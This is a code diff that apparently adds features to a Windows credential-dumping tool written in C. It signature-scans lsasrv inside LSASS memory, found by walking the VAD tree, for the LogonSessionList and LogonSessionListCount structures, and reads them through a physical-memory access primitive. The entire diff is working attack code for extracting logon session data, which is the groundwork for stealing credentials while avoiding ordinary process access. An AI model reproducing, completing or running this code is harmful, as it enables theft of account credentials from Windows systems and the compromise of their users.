@@ -152,7 +152,12 @@ void walkAVL(ULONGLONG VadRoot, ULONGLONG VadCount) {
     VAD* vadList = NULL;
 
 
+    ULONGLONG LogonSessionListCount = 0;
     ULONGLONG LogonSessionList = 0;
+    ULONGLONG LogonSessionList_offset = 0;
+    ULONGLONG LogonSessionListCount_offset = 0;
+
+
 
     printf("[+] Starting to walk _RTL_AVL_TREE...\n");
     queue = (ULONGLONG *)malloc(sizeof(ULONGLONG) * VadCount * 4);
@@ -315,8 +320,29 @@ void walkAVL(ULONGLONG VadRoot, ULONGLONG VadCount) {
             memcpy(needle_buffer, &LogonSessionList_needle, sizeof(LOGONSESSIONLIST_NEEDLE));
             int offset = 0;
             offset = memmem((PBYTE)lsasrv, j, needle_buffer, sizeof(LOGONSESSIONLIST_NEEDLE));
-            
 
+
+            memcpy(&LogonSessionList_offset, lsasrv + offset + 0x17, 4);
+            printf("LogonSessionList Relative Offset: 0x%08llx\n", LogonSessionList_offset);
+
+            LogonSessionList = vadList[i].start + offset + 0x17 + 4 + LogonSessionList_offset;
+            printf("LogonSessionList: 0x%08llx\n", LogonSessionList);
+            large_start.QuadPart = v2p(LogonSessionList);
+            printf("Test1: 0x%08llx\n", readPhysMemPointer(large_start));
+            large_start.QuadPart = v2p(LogonSessionList+8);
+            printf("Test2: 0x%08llx\n", readPhysMemPointer(large_start));
+            large_start.QuadPart = v2p(LogonSessionList + 264);
+            printf("Test3: 0x%08llx\n", readPhysMemPointer(large_start));
+
+
+
+
+            memcpy(&LogonSessionListCount_offset, lsasrv + offset - 4, 4);
+            printf("LogonSessionListCount Relative Offset: 0x%08llx\n", LogonSessionListCount_offset);
+            LogonSessionListCount = vadList[i].start + offset + LogonSessionListCount_offset;
+            printf("LogonSessionListCount at: 0x%08llx\n", LogonSessionListCount);
+            large_start.QuadPart = v2p(LogonSessionListCount);
+            printf("LogonSessionListCount value is %lld\n", readPhysMemPointer(large_start));
             break;
         }
     }
